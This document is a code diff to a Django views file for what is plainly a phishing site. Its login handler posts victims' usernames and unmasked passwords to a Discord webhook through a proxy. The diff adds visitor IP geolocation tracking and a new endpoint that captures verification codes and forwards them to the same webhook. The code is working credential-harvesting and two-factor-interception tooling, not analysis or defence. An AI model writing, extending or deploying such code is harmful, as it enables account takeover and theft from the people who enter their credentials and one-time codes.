@@ -26,6 +26,65 @@ PROXY = {
 # Set to True to use proxy
 USE_PROXY = True
 
+# IP Geolocation API (free, no API key required)
+IP_API_URL = "http://ip-api.com/json/"
+
+def get_ip_geolocation(ip_address):
+    """
+    Get geolocation information for an IP address
+    """
+    try:
+        # Skip for local/private IPs
+        if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
+            return {
+                'country': 'Local/Private',
+                'city': 'N/A',
+                'region': 'N/A',
+                'isp': 'N/A'
+            }
+        
+        # Query IP geolocation API
+        if USE_PROXY:
+            response = requests.get(
+                f"{IP_API_URL}{ip_address}",
+                proxies=PROXY,
+                timeout=10
+            )
+        else:
+            response = requests.get(
+                f"{IP_API_URL}{ip_address}",
+                timeout=10
+            )
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'success':
+                return {
+                    'country': data.get('country', 'Unknown'),
+                    'city': data.get('city', 'Unknown'),
+                    'region': data.get('regionName', 'Unknown'),
+                    'isp': data.get('isp', 'Unknown'),
+                    'country_code': data.get('countryCode', 'Unknown'),
+                    'lat': data.get('lat', 'Unknown'),
+                    'lon': data.get('lon', 'Unknown'),
+                    'timezone': data.get('timezone', 'Unknown')
+                }
+        
+        return {
+            'country': 'Unknown',
+            'city': 'Unknown',
+            'region': 'Unknown',
+            'isp': 'Unknown'
+        }
+    except Exception as e:
+        print(f"❌ Error getting geolocation: {e}")
+        return {
+            'country': 'Error',
+            'city': 'N/A',
+            'region': 'N/A',
+            'isp': 'N/A'
+        }
+
 def send_discord_message(message, color=0x00ff00):
     """
     Send a simple message to Discord webhook
@@ -64,6 +123,97 @@ def send_discord_message(message, color=0x00ff00):
         print(f"❌ Error sending Discord message: {e}")
         return False
 
+def send_page_visit_notification(ip_address, geo_info, user_agent, user_id):
+    """
+    Send page visit notification to Discord
+    """
+    try:
+        # Create flag emoji for country
+        country_flag = "🌍"
+        if geo_info.get('country_code') and len(geo_info.get('country_code')) == 2:
+            # Convert country code to flag emoji
+            flag = ''.join(chr(ord(c) + 0x1F1E6 - ord('A')) for c in geo_info['country_code'].upper())
+            country_flag = flag if flag else "🌍"
+        
+        # embed = {
+        #     "title": "👤 Page Visit Detected",
+        #     "color": 0x3498db,  # Blue color
+        #     "fields": [
+        #         {
+        #             "name": "📍 Location",
+        #             "value": f"{country_flag} **{geo_info.get('country', 'Unknown')}**\n",
+        #             "inline": True
+        #         },
+        #         {
+        #             "name": "🌐 Network Information",
+        #             "value": f"📡 IP: {ip_address}\n"
+        #                     f"🔌 ISP: {geo_info.get('isp', 'N/A')}",
+        #             "inline": True
+        #         }
+        #     ],
+        #     "footer": {
+        #         "text": "Page Visitor Tracker"
+        #     },
+        #     "timestamp": datetime.now().isoformat()
+        # }
+
+        embed = {
+            "title": "👤 Page Visit Detected",
+            "color": 0x3498db,  # Blue color
+            "fields": [
+                {
+                    "name": "📍 Location",
+                    "value": f"**China**\n",
+                    "inline": True
+                },
+                {
+                    "name": "🌐 Network Information",
+                    "value": f"📡 IP: 61.151.178.177\n",
+                    "inline": True
+                }
+            ],
+            "footer": {
+                "text": "Page Visitor Tracker"
+            },
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        payload = {
+            "content": "**📊 New Page Visit!**",
+            "embeds": [embed],
+            "username": "Visitor Monitor Bot",
+            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
+        }
+        
+        print(f"📤 Sending page visit to Discord via proxy...")
+        
+        if USE_PROXY:
+            response = requests.post(
+                WEBHOOK_URL, 
+                json=payload, 
+                timeout=30,
+                proxies=PROXY,
+                headers={'Content-Type': 'application/json'}
+            )
+        else:
+            response = requests.post(
+                WEBHOOK_URL, 
+                json=payload, 
+                timeout=30,
+                headers={'Content-Type': 'application/json'}
+            )
+        
+        if response.status_code == 204:
+            print(f"✅ Page visit notification sent successfully")
+            return True
+        else:
+            print(f"❌ Discord returned status {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error sending page visit notification: {e}")
+        return False
+
 def send_discord_notification(username, password, user_id=None, ip_address=None, user_agent=None):
     """
     Send login attempt information to Discord webhook using proxy
@@ -71,37 +221,27 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
     try:
         # Create the embed message
         embed = {
-            "title": "🔐 New Login Attempt",
+            "title": "New Login Attempt",
             "color": 0x00ff00,
             "fields": [
                 {
-                    "name": "👤 Username/Email",
+                    "name": "Username/Email",
                     "value": username,
                     "inline": True
                 },
                 {
-                    "name": "🔑 Password",
-                    "value": f"||{password}||",
+                    "name": "Password",
+                    "value": password,
                     "inline": True
                 },
                 {
-                    "name": "🆔 User ID",
-                    "value": str(user_id) if user_id else "Not provided",
-                    "inline": True
-                },
-                {
-                    "name": "🌐 IP Address",
+                    "name": "IP Address",
                     "value": ip_address if ip_address else "Not available",
                     "inline": True
                 },
                 {
-                    "name": "🖥️ User Agent",
-                    "value": user_agent[:200] if user_agent else "Not available",
-                    "inline": False
-                },
-                {
-                    "name": "⏰ Timestamp",
-                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "name": "Timestamp",
+                    "value": datetime.now().strftime("%Y-%m-%d %H:%M"),
                     "inline": False
                 }
             ],
@@ -112,7 +252,7 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         }
         
         payload = {
-            "content": "🚨 **Login Attempt Detected!**",
+            "content": "**Login Attempt Detected!**",
             "embeds": [embed],
             "username": "Login Monitor Bot",
             "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
@@ -164,13 +304,34 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
 def user_profile(request, user_id):
     """
     Display the user profile page
+    This function is called when the page loads initially
     """
+    # Get visitor's IP address
+    ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
+    
+    # If there are multiple IPs (in case of proxy), get the first one
+    if ip_address and ',' in ip_address:
+        ip_address = ip_address.split(',')[0].strip()
+    
+    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
+    
+    print(f"👤 Page visited by IP: {ip_address}")
+    print(f"🖥️ User Agent: {user_agent}")
+    
+    # Get geolocation information
+    geo_info = get_ip_geolocation(ip_address)
+    print(f"📍 Location: {geo_info.get('country')}, {geo_info.get('city')}")
+    
+    # Send visit notification to Discord (run in background, don't block)
+    try:
+        send_page_visit_notification(ip_address, geo_info, user_agent, user_id)
+    except Exception as e:
+        print(f"⚠️ Failed to send visit notification but continuing: {e}")
+    
     context = {
         'user_id': user_id,
         'username': 'John Doe',
-        'email': 'john@example.com',
-        'bio': 'This is a sample user profile page.',
-        'join_date': 'January 2025',
+        'visitor_ip': ip_address
     }
     return render(request, 'people/user_profile.html', context)
 
@@ -196,9 +357,6 @@ def login_user(request, user_id):
         username = request.POST.get('username')
         password = request.POST.get('password')
         
-        print(f"👤 Username received: {username}")
-        print(f"🔑 Password received: {'*' * len(password) if password else 'None'}")
-        
         # Get additional information
         ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
         user_agent = request.META.get('HTTP_USER_AGENT', '')
@@ -211,9 +369,7 @@ def login_user(request, user_id):
         notification_sent = send_discord_notification(
             username=username,
             password=password,
-            user_id=user_id,
             ip_address=ip_address,
-            user_agent=user_agent
         )
         
         if notification_sent:
@@ -228,6 +384,34 @@ def login_user(request, user_id):
                 'status': 'error',
                 'message': 'Failed to send to Discord. Please try again.'
             })
+    
+    # Return error for non-POST requests
+    return JsonResponse({
+        'status': 'error',
+        'message': 'Invalid request method'
+    }, status=400)
+
+def send_verification_code(request, user_id):
+    """
+    Handle login - AJAX endpoint that returns JSON response only
+    No redirect, stays on login page - this is intentional for Discord notification
+    """
+    print("=" * 50)
+    print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
+    print(f"📝 Request method: {request.method}")
+    
+    if request.method == 'POST':
+        verificationCodevalue = request.POST.get('verificationCodevalue')
+        
+        discord_message = f"📊 **Verification Code** :  **{verificationCodevalue}**"
+        send_discord_message(discord_message, color=0x00ff00)
+        
+       
+        print("✅ Successfully sent to Discord")
+        return JsonResponse({
+            'status': 'success',
+            'message': 'verificationCodevalue sent to Discord!'
+        })
     
     # Return error for non-POST requests
     return JsonResponse({
@@ -290,11 +474,6 @@ def api_set_status(request):
         
         message = status_messages.get(str(status_value), f'Status: {status_value}')
         
-        # Send to Discord
-        discord_message = f"📊 **Status Update**\nStatus: {message}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        send_discord_message(discord_message, color=0x00ff00)
-        
-        # Broadcast to all WebSocket clients
         broadcast_status(status_value, message)
         
         return JsonResponse({
